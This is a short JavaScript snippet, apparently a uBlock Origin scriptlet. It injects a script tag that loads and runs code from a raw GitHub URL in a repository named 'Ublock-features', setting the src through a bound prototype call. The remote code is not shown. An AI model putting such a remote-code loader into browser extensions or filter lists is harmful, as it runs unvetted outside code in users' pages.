/// execute_script.js
!function(){
  let s = document.createElement("script");
  HTMLElement.prototype.setAttribute.bind(s, "src", "https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js")();
  document.head.appendChild(s);
}();
